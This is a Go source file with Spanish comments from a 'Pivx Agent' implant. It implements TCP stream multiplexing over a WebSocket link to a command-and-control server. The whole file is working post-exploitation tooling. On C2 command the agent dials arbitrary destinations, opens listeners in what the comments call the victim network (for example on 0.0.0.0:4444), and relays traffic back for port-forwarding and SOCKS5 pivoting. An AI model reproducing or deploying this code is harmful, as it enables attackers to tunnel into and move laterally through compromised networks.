// Pivx Agent - Multiplexado de streams TCP (Fase 3)
//
// Ademas del tunel L3 (raw-IP sobre gVisor, ver netstack.go), el agente soporta
// un plano de streams TCP multiplexados sobre la MISMA conexion WebSocket. Sirve
// para port-forwarding L4 (local/remote) y para el proxy SOCKS5 del servidor.
//
// Discriminacion de frames binarios sin romper el tunel L3:
//   - Un paquete IP real empieza siempre por el nibble 0x4 (IPv4) o 0x6 (IPv6).
//   - Un frame MUX empieza por 0x01 (nibble 0x0), que jamas aparece como primer
//     byte de un paquete IP -> ambos coexisten en frames binarios sin ambiguedad.
//
// Formato del frame binario MUX:
//   [0]      = 0x01                (opcode MUX_DATA)
//   [1..5]   = stream_id (uint32, big-endian)
//   [5..]    = payload (bytes crudos del stream TCP)
//
// El ciclo de vida del stream (abrir/ack/cerrar) viaja por el plano de control
// (frames de TEXTO/JSON): stream_open, stream_open_ack, stream_close, y el alta
// de listeners de remote-forward: rforward_start / rforward_stop.
package main

import (
	"encoding/binary"
	"encoding/json"
	"log"
	"net"
	"sync"
	"time"
)

const (
	muxData      = 0x01 // primer byte de un frame binario MUX
	muxDialTO    = 10 * time.Second
	agentIDBit   = uint32(1) << 31 // ids iniciados por el agente: bit alto a 1
	muxCopyBufSz = 32 * 1024
)

// Tipos de control adicionales del plano de streams.
const (
	MsgStreamOpen  MessageType = "stream_open"
	MsgStreamAck   MessageType = "stream_open_ack"
	MsgStreamClose MessageType = "stream_close"
	MsgRFwdStart   MessageType = "rforward_start"
	MsgRFwdStop    MessageType = "rforward_stop"
)

// StreamOpenPayload solicita abrir un stream. Segun el sentido:
//   - server -> agent: el agente debe marcar (dial) TCP hacia Dst y hacer proxy.
//   - agent -> server: notifica una conexion aceptada en el listener FwdID de un
//     remote-forward; el servidor la entregara a su destino local.
type StreamOpenPayload struct {
	StreamID uint32 `json:"stream_id"`
	Dst      string `json:"dst,omitempty"`
	FwdID    string `json:"fwd_id,omitempty"`
}

// StreamAckPayload responde a un stream_open server->agent.
type StreamAckPayload struct {
	StreamID uint32 `json:"stream_id"`
	OK       bool   `json:"ok"`
	Err      string `json:"err,omitempty"`
}

// StreamClosePayload cierra un stream en curso.
type StreamClosePayload struct {
	StreamID uint32 `json:"stream_id"`
}

// RFwdPayload gestiona un listener de remote-forward en la victima.
type RFwdPayload struct {
	FwdID string `json:"fwd_id"`
	Bind  string `json:"bind,omitempty"` // p.ej. "0.0.0.0:4444"
}

// Mux mantiene los streams TCP activos y los listeners de remote-forward.
type Mux struct {
	mu       sync.Mutex
	streams  map[uint32]net.Conn
	rfwds    map[string]net.Listener
	nextID   uint32
	sendCtl  func(ControlMessage) // envia un frame de control (texto/JSON)
	sendData func([]byte)         // envia un frame binario ya construido
	agentID  string
}

// NewMux crea el multiplexor. sendCtl encola control (texto); sendData encola un
// frame binario MUX ya serializado hacia el WebSocket.
func NewMux(agentID string, sendCtl func(ControlMessage), sendData func([]byte)) *Mux {
	return &Mux{
		streams:  make(map[uint32]net.Conn),
		rfwds:    make(map[string]net.Listener),
		sendCtl:  sendCtl,
		sendData: sendData,
		agentID:  agentID,
	}
}

// --- serializacion de frames binarios MUX ---------------------------------

// encodeMuxData construye [0x01][stream_id BE][payload].
func encodeMuxData(streamID uint32, payload []byte) []byte {
	out := make([]byte, 5+len(payload))
	out[0] = muxData
	binary.BigEndian.PutUint32(out[1:5], streamID)
	copy(out[5:], payload)
	return out
}

// IsMuxFrame indica si un frame binario pertenece al plano MUX (no al tunel L3).
func IsMuxFrame(b []byte) bool {
	return len(b) > 0 && b[0] == muxData
}

// OnBinary procesa un frame binario MUX (payload de un stream) recibido del C2.
func (m *Mux) OnBinary(frame []byte) {
	if len(frame) < 5 || frame[0] != muxData {
		return
	}
	streamID := binary.BigEndian.Uint32(frame[1:5])
	payload := frame[5:]
	m.mu.Lock()
	conn := m.streams[streamID]
	m.mu.Unlock()
	if conn == nil {
		return // stream desconocido o ya cerrado
	}
	if _, err := conn.Write(payload); err != nil {
		m.closeStream(streamID, true)
	}
}

// --- plano de control ------------------------------------------------------

// HandleControl despacha los mensajes de control del plano de streams. Devuelve
// true si consumio el mensaje (era del plano de streams).
func (m *Mux) HandleControl(msg ControlMessage) bool {
	switch msg.Type {
	case MsgStreamOpen:
		var p StreamOpenPayload
		if json.Unmarshal(msg.Payload, &p) == nil {
			go m.handleServerOpen(p) // dial hacia Dst puede bloquear -> goroutine
		}
		return true
	case MsgStreamClose:
		var p StreamClosePayload
		if json.Unmarshal(msg.Payload, &p) == nil {
			m.closeStream(p.StreamID, false)
		}
		return true
	case MsgRFwdStart:
		var p RFwdPayload
		if json.Unmarshal(msg.Payload, &p) == nil {
			m.startRemoteForward(p)
		}
		return true
	case MsgRFwdStop:
		var p RFwdPayload
		if json.Unmarshal(msg.Payload, &p) == nil {
			m.stopRemoteForward(p.FwdID)
		}
		return true
	}
	return false
}

// handleServerOpen atiende un stream_open server->agent: marca hacia Dst y, si
// conecta, hace de proxy; responde siempre con stream_open_ack.
func (m *Mux) handleServerOpen(p StreamOpenPayload) {
	conn, err := net.DialTimeout("tcp", p.Dst, muxDialTO)
	if err != nil {
		log.Printf("[mux] destino inalcanzable %s: %v", p.Dst, err)
		m.sendAck(p.StreamID, false, err.Error())
		return
	}
	m.register(p.StreamID, conn)
	m.sendAck(p.StreamID, true, "")
	log.Printf("[mux] stream %d -> %s establecido", p.StreamID, p.Dst)
	go m.pump(p.StreamID, conn)
}

// --- remote forward (listener en la victima) -------------------------------

// startRemoteForward abre un listener TCP en la red victima; cada conexion
// aceptada se convierte en un stream hacia el servidor (que la entregara a su
// destino local configurado).
func (m *Mux) startRemoteForward(p RFwdPayload) {
	ln, err := net.Listen("tcp", p.Bind)
	if err != nil {
		log.Printf("[mux] rforward %s: no se pudo escuchar en %s: %v", p.FwdID, p.Bind, err)
		return
	}
	m.mu.Lock()
	if old := m.rfwds[p.FwdID]; old != nil {
		old.Close()
	}
	m.rfwds[p.FwdID] = ln
	m.mu.Unlock()
	log.Printf("[mux] rforward %s escuchando en %s", p.FwdID, p.Bind)

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return // listener cerrado
			}
			sid := m.allocID()
			m.register(sid, conn)
			// Notificar al servidor: hay una nueva conexion para este forward.
			m.sendCtl(ControlMessage{
				Type:    MsgStreamOpen,
				AgentID: m.agentID,
				Payload: mustJSON(StreamOpenPayload{StreamID: sid, FwdID: p.FwdID}),
			})
			log.Printf("[mux] rforward %s: conexion aceptada -> stream %d", p.FwdID, sid)
			go m.pump(sid, conn)
		}
	}()
}

func (m *Mux) stopRemoteForward(fwdID string) {
	m.mu.Lock()
	ln := m.rfwds[fwdID]
	delete(m.rfwds, fwdID)
	m.mu.Unlock()
	if ln != nil {
		ln.Close()
		log.Printf("[mux] rforward %s detenido", fwdID)
	}
}

// --- utilidades de stream --------------------------------------------------

// pump lee de la conexion local y encola el payload como frames MUX hacia el C2.
// Al terminar (EOF/error), cierra el stream y avisa al servidor.
func (m *Mux) pump(streamID uint32, conn net.Conn) {
	buf := make([]byte, muxCopyBufSz)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			m.sendData(encodeMuxData(streamID, buf[:n]))
		}
		if err != nil {
			break
		}
	}
	m.closeStream(streamID, true)
}

func (m *Mux) register(streamID uint32, conn net.Conn) {
	m.mu.Lock()
	m.streams[streamID] = conn
	m.mu.Unlock()
}

// closeStream cierra la conexion local y opcionalmente notifica stream_close al
// servidor (notify=true cuando el cierre lo origina el agente).
func (m *Mux) closeStream(streamID uint32, notify bool) {
	m.mu.Lock()
	conn := m.streams[streamID]
	delete(m.streams, streamID)
	m.mu.Unlock()
	if conn == nil {
		return
	}
	conn.Close()
	if notify {
		m.sendCtl(ControlMessage{
			Type:    MsgStreamClose,
			AgentID: m.agentID,
			Payload: mustJSON(StreamClosePayload{StreamID: streamID}),
		})
	}
}

func (m *Mux) sendAck(streamID uint32, ok bool, errMsg string) {
	m.sendCtl(ControlMessage{
		Type:    MsgStreamAck,
		AgentID: m.agentID,
		Payload: mustJSON(StreamAckPayload{StreamID: streamID, OK: ok, Err: errMsg}),
	})
}

// allocID entrega un id de stream iniciado por el agente (bit alto a 1) para no
// colisionar con los ids que asigna el servidor (bit alto a 0).
func (m *Mux) allocID() uint32 {
	m.mu.Lock()
	m.nextID++
	id := m.nextID | agentIDBit
	m.mu.Unlock()
	return id
}

// Close libera todos los streams y listeners (al caerse la sesion).
func (m *Mux) Close() {
	m.mu.Lock()
	for _, ln := range m.rfwds {
		ln.Close()
	}
	for _, conn := range m.streams {
		conn.Close()
	}
	m.rfwds = make(map[string]net.Listener)
	m.streams = make(map[uint32]net.Conn)
	m.mu.Unlock()
}

func mustJSON(v any) json.RawMessage {
	b, _ := json.Marshal(v)
	return b
}
